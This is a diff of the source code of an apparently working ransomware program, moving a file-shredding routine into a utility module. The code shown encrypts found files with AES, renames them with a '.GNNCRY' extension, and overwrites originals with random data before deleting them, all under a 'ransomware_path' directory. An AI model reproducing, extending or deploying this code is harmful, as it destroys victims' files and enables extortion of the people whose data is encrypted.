@@ -4,6 +4,7 @@ import get_files
 import symmetric
 import enviroment
 import generate_keys
+import utils
 
 import os
 import string
@@ -43,25 +44,6 @@ def encrypt_priv_key(msg, key):
     return encrypted
 
 
-def shred(file_name,  passes=1):
-
-    def generate_data(length):
-        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
-        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))
-
-    if not os.path.isfile(file_name):
-        return False
-
-    ld = os.path.getsize(file_name)
-    with open(file_name,  "w") as fh:
-        for _ in range(int(passes)):
-            data = generate_data(ld)
-            fh.write(data)
-            fh.seek(0,  0)
-            
-    os.remove(file_name)
-
-
 def start_encryption(files):
     AES_and_base64_path = []
     for found_file in files:
@@ -78,7 +60,7 @@ def start_encryption(files):
             continue
 
         encrypted = AES_obj.encrypt(file_content)
-        shred(found_file)
+        utils.shred(found_file)
 
         new_file_name = found_file.decode('utf-8') + ".GNNCRY"
         with open(new_file_name, 'wb') as f:
@@ -93,7 +75,6 @@ def start_encryption(files):
 
 
 def menu():
-
     # create ransomware directory 
     try:
         os.mkdir(variables.ransomware_path)
